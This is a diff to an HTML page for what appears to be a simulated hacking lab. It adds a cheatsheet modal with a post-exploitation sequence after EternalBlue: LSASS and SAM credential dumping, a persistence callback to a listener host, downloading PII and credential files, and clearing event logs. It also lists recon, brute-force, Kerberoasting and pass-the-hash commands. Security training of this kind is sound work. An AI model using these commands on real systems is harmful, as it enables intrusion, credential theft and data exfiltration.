@@ -240,6 +240,13 @@
 
     <!-- Right side -->
     <div id="taskbar-right" class="flex items-center gap-3 ml-auto">
+      <button id="cheatsheet-toggle-btn"
+        class="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium
+               bg-emerald-50 hover:bg-emerald-100 border border-emerald-200 text-emerald-700 transition-colors"
+        style="font-family:'Ubuntu',sans-serif"
+        title="Cheatsheets">
+        <i class="fa fa-skull-crossbones text-emerald-600"></i> Cheatsheet
+      </button>
       <button id="ctf-toggle-btn"
         class="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium
                bg-violet-50 hover:bg-violet-100 border border-violet-200 text-violet-700 transition-colors"
@@ -249,6 +256,214 @@
       <div class="w-px h-5 bg-slate-200 flex-shrink-0"></div>
       <span id="clock" class="text-sm font-sans font-medium text-slate-500 pr-1"
         style="min-width:42px;text-align:right"></span>
+    </div>
+  </div>
+
+  <!-- ── Cheatsheet modal (tabbed) ──────────────────────────────────────── -->
+  <div id="cheatsheet-modal" class="hidden fixed inset-0 flex items-center justify-center z-[600]"
+    style="background:rgba(0,0,0,0.5);backdrop-filter:blur(6px)">
+    <div class="rounded-2xl shadow-2xl overflow-hidden flex flex-col"
+      style="width:720px;max-height:85vh;background:#0f172a;border:1px solid #1e293b">
+      <!-- Header -->
+      <div class="flex items-center gap-3 px-5 py-3.5"
+        style="background:#1e293b;border-bottom:1px solid #334155">
+        <i class="fa fa-book text-emerald-400 text-lg"></i>
+        <h3 class="text-sm font-semibold text-slate-100 flex-1" style="font-family:'Ubuntu',sans-serif">
+          Cheatsheets
+        </h3>
+        <button id="cheatsheet-close" class="text-slate-400 hover:text-slate-200 text-xl font-bold leading-none ml-2">×</button>
+      </div>
+      <!-- Tab bar -->
+      <div class="flex items-stretch gap-0 px-3"
+        style="background:#1e293b;border-bottom:1px solid #334155">
+        <button class="cs-tab cs-tab-active px-4 py-2 text-xs font-medium border-b-2 border-emerald-400 text-emerald-300 transition-colors"
+          data-tab="postex" style="font-family:'Ubuntu',sans-serif">
+          <i class="fa fa-skull-crossbones mr-1.5"></i>Post-Exploitation
+        </button>
+        <button class="cs-tab px-4 py-2 text-xs font-medium border-b-2 border-transparent text-slate-400 hover:text-slate-200 transition-colors"
+          data-tab="linux" style="font-family:'Ubuntu',sans-serif">
+          <i class="fa fa-terminal mr-1.5"></i>Linux Commands
+        </button>
+      </div>
+      <!-- Body -->
+      <div class="flex-1 overflow-y-auto px-5 py-4 text-xs font-mono text-slate-200 leading-relaxed"
+        style="background:#0f172a">
+
+        <!-- ── Tab: Post-Exploitation ────────────────────────────────────── -->
+        <div class="cs-pane" data-pane="postex">
+          <div class="mb-1 text-[10px] tracking-widest text-emerald-400 font-mono">SYSTEM @ 10.10.20.10 &nbsp;·&nbsp; runs after EternalBlue lands</div>
+          <div class="mb-4 text-[11px] text-slate-400 leading-snug">The order is: stabilize, enumerate, dump credentials, persist, loot, exfil. Each phase locks in your access before doing something noisier.</div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► 1. STABILIZE</div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">getuid</span> <span class="text-slate-500"># confirm SYSTEM</span></div>
+              <div><span class="text-violet-400">ps</span> <span class="text-slate-500"># list processes</span></div>
+              <div><span class="text-violet-400">migrate 1980</span> <span class="text-slate-500"># move into explorer.exe</span></div>
+            </div>
+          </div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► 2. ENUMERATE  <span class="text-slate-500 normal-case">(drop to <span class="text-amber-300">shell</span> first)</span></div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">whoami /priv</span> &nbsp; <span class="text-violet-400">whoami /groups</span></div>
+              <div><span class="text-violet-400">systeminfo</span> &nbsp; <span class="text-violet-400">ver</span></div>
+              <div><span class="text-violet-400">ipconfig /all</span> &nbsp; <span class="text-violet-400">arp -a</span> &nbsp; <span class="text-violet-400">route print</span></div>
+              <div><span class="text-violet-400">netstat -ano</span></div>
+              <div><span class="text-violet-400">net user</span> &nbsp; <span class="text-violet-400">net localgroup administrators</span></div>
+              <div><span class="text-violet-400">net user /domain</span> &nbsp; <span class="text-violet-400">net group "Domain Admins" /domain</span></div>
+              <div><span class="text-violet-400">tasklist /svc</span> &nbsp; <span class="text-violet-400">sc query</span></div>
+              <div><span class="text-violet-400">cmdkey /list</span> &nbsp; <span class="text-violet-400">schtasks /query</span></div>
+              <div><span class="text-violet-400">wmic qfe list</span> <span class="text-slate-500"># installed patches</span></div>
+              <div><span class="text-violet-400">findstr /si "password" *.txt *.xml *.ini</span></div>
+            </div>
+          </div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► 3. DUMP CREDENTIALS  <span class="text-slate-500 normal-case">(in meterpreter)</span></div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">hashdump</span> <span class="text-slate-500"># local SAM hashes</span></div>
+              <div><span class="text-violet-400">load kiwi</span></div>
+              <div><span class="text-violet-400">creds_all</span> <span class="text-slate-500"># plaintext from LSASS</span></div>
+              <div><span class="text-violet-400">lsa_dump_sam</span></div>
+              <div><span class="text-violet-400">lsa_dump_secrets</span></div>
+            </div>
+            <div class="text-emerald-400 text-[11px] tracking-wider mt-2 mb-1">  Or: ProcDump + offline parse</div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-amber-300">shell</span></div>
+              <div><span class="text-violet-400">procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp</span></div>
+              <div><span class="text-amber-300">exit</span></div>
+              <div><span class="text-violet-400">download C:\Windows\Temp\lsass.dmp /tmp/lsass.dmp</span></div>
+              <div><span class="text-slate-500"># on linux:</span></div>
+              <div><span class="text-violet-400">pypykatz lsa minidump /tmp/lsass.dmp</span></div>
+            </div>
+          </div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► 4. PERSIST</div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">run persistence -A -S -U -i 60 -p 4444 -r 10.10.20.5</span></div>
+            </div>
+          </div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► 5. LOOT &amp; EXFIL</div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">type C:\Users\Administrator\Desktop\flag.txt</span></div>
+              <div><span class="text-violet-400">type C:\CORP_DATA\Customer\Credit_Card_Records\root.txt</span></div>
+              <div><span class="text-violet-400">type C:\CORP_DATA\IT\VPN_Credentials.txt</span></div>
+              <div><span class="text-violet-400">download C:\CORP_DATA\HR\All_Employees_PII.csv /tmp/pii.csv</span></div>
+            </div>
+          </div>
+
+          <div class="mb-1">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► 6. COVER TRACKS  <span class="text-slate-500 normal-case">(noisier than not)</span></div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">wevtutil cl Security</span> <span class="text-slate-500"># writes Event 1102 — itself logged</span></div>
+              <div><span class="text-violet-400">del /f C:\Windows\Temp\lsass.dmp</span></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ── Tab: Linux Commands ──────────────────────────────────────── -->
+        <div class="cs-pane hidden" data-pane="linux">
+          <div class="mb-4 text-[11px] text-slate-400 leading-snug">Every command listed here is wired up in the lab and returns realistic output. Pre-exploit recon and general system administration.</div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► IDENTITY &amp; SHELL</div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">whoami</span> &nbsp; <span class="text-violet-400">id</span> &nbsp; <span class="text-violet-400">hostname</span> &nbsp; <span class="text-violet-400">pwd</span></div>
+              <div><span class="text-violet-400">uname -a</span> &nbsp; <span class="text-violet-400">cat /etc/os-release</span></div>
+              <div><span class="text-violet-400">env</span> &nbsp; <span class="text-violet-400">date</span> &nbsp; <span class="text-violet-400">uptime</span></div>
+              <div><span class="text-violet-400">w</span> &nbsp; <span class="text-violet-400">who</span> &nbsp; <span class="text-violet-400">last</span></div>
+              <div><span class="text-violet-400">history</span> &nbsp; <span class="text-violet-400">sudo -l</span> &nbsp; <span class="text-violet-400">sudo su</span></div>
+            </div>
+          </div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► FILESYSTEM</div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">ls</span> &nbsp; <span class="text-violet-400">ls -la</span> &nbsp; <span class="text-violet-400">cd</span> &nbsp; <span class="text-violet-400">cat &lt;file&gt;</span></div>
+              <div><span class="text-violet-400">find / -perm -4000 2&gt;/dev/null</span> <span class="text-slate-500"># SUID hunt</span></div>
+              <div><span class="text-violet-400">grep -r "password" /etc 2&gt;/dev/null</span></div>
+              <div><span class="text-violet-400">stat &lt;file&gt;</span> &nbsp; <span class="text-violet-400">file &lt;file&gt;</span> &nbsp; <span class="text-violet-400">wc &lt;file&gt;</span></div>
+              <div><span class="text-violet-400">head</span> &nbsp; <span class="text-violet-400">tail</span> &nbsp; <span class="text-violet-400">strings</span> &nbsp; <span class="text-violet-400">xxd</span></div>
+              <div><span class="text-violet-400">md5sum</span> &nbsp; <span class="text-violet-400">sha256sum</span> &nbsp; <span class="text-violet-400">base64</span></div>
+            </div>
+          </div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► PROCESSES &amp; HARDWARE</div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">ps aux</span> &nbsp; <span class="text-violet-400">top</span> &nbsp; <span class="text-violet-400">htop</span></div>
+              <div><span class="text-violet-400">lscpu</span> &nbsp; <span class="text-violet-400">free -h</span> &nbsp; <span class="text-violet-400">df -h</span></div>
+              <div><span class="text-violet-400">lsblk</span> &nbsp; <span class="text-violet-400">lspci</span> &nbsp; <span class="text-violet-400">lsusb</span> &nbsp; <span class="text-violet-400">dmidecode</span></div>
+              <div><span class="text-violet-400">lsmod</span> &nbsp; <span class="text-violet-400">lsof</span> &nbsp; <span class="text-violet-400">vmstat</span></div>
+              <div><span class="text-violet-400">journalctl</span> &nbsp; <span class="text-violet-400">dmesg</span></div>
+            </div>
+          </div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► NETWORKING</div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">ip a</span> &nbsp; <span class="text-violet-400">ifconfig</span> &nbsp; <span class="text-violet-400">ip route</span> &nbsp; <span class="text-violet-400">arp -a</span></div>
+              <div><span class="text-violet-400">ss -tulpn</span> &nbsp; <span class="text-violet-400">netstat -tulpn</span></div>
+              <div><span class="text-violet-400">ping &lt;host&gt;</span> &nbsp; <span class="text-violet-400">traceroute &lt;host&gt;</span></div>
+              <div><span class="text-violet-400">dig &lt;host&gt;</span> &nbsp; <span class="text-violet-400">nslookup &lt;host&gt;</span></div>
+              <div><span class="text-violet-400">curl &lt;url&gt;</span> &nbsp; <span class="text-violet-400">wget &lt;url&gt;</span></div>
+              <div><span class="text-violet-400">tcpdump -i eth0</span> &nbsp; <span class="text-violet-400">iptables -L -n</span></div>
+            </div>
+          </div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► RECON &amp; SCANNING</div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">sudo nmap -sn 10.10.10.0/24</span> <span class="text-slate-500"># ping sweep</span></div>
+              <div><span class="text-violet-400">nmap -sV -sC 10.10.10.10</span> <span class="text-slate-500"># service scan</span></div>
+              <div><span class="text-violet-400">sudo nmap -p445 --script smb-vuln-ms17-010 10.10.20.10</span></div>
+              <div><span class="text-violet-400">enum4linux -a 10.10.10.10</span></div>
+              <div><span class="text-violet-400">rpcclient -U "" -N 10.10.10.10</span></div>
+              <div><span class="text-violet-400">smbclient -L //10.10.10.10 -N</span></div>
+              <div><span class="text-violet-400">kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt</span></div>
+              <div><span class="text-violet-400">gobuster dir -u http://10.10.10.50 -w /usr/share/wordlists/dirb/common.txt</span></div>
+              <div><span class="text-violet-400">hydra -l admin -P rockyou.txt 10.10.10.10 ssh</span></div>
+            </div>
+          </div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► AD ATTACKS  <span class="text-slate-500 normal-case">(with one credential)</span></div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">impacket-GetUserSPNs corp.local/john.doe:Password1! -dc-ip 10.10.10.10 -request</span></div>
+              <div><span class="text-violet-400">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast</span></div>
+              <div><span class="text-violet-400">hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt</span></div>
+              <div><span class="text-violet-400">crackmapexec smb 10.10.10.10 -u svc_backup -p 'Backup2023!'</span></div>
+              <div><span class="text-violet-400">crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683...</span> <span class="text-slate-500"># PtH</span></div>
+            </div>
+          </div>
+
+          <div class="mb-4">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► PACKAGES &amp; EDITORS</div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">apt list --installed</span> &nbsp; <span class="text-violet-400">dpkg -l</span></div>
+              <div><span class="text-violet-400">sudo apt update</span> &nbsp; <span class="text-violet-400">sudo apt install &lt;pkg&gt;</span></div>
+              <div><span class="text-violet-400">nano &lt;file&gt;</span> &nbsp; <span class="text-violet-400">vim &lt;file&gt;</span></div>
+            </div>
+          </div>
+
+          <div class="mb-1">
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► EXTRAS</div>
+            <div class="pl-3 space-y-0.5">
+              <div><span class="text-violet-400">neofetch</span> &nbsp; <span class="text-violet-400">cowsay hi</span> &nbsp; <span class="text-violet-400">fortune</span> &nbsp; <span class="text-violet-400">sl</span> &nbsp; <span class="text-violet-400">doom</span></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+      <!-- Footer -->
+      <div class="px-5 py-2.5 text-[10px] text-slate-500 font-mono"
+        style="background:#1e293b;border-top:1px solid #334155">
+        <span class="text-emerald-400">esc</span> close &nbsp;·&nbsp; click outside to dismiss &nbsp;·&nbsp; full notes in <span class="text-amber-300">POST_EXPLOITATION.md</span> / <span class="text-amber-300">RECON.md</span>
+      </div>
     </div>
   </div>
 
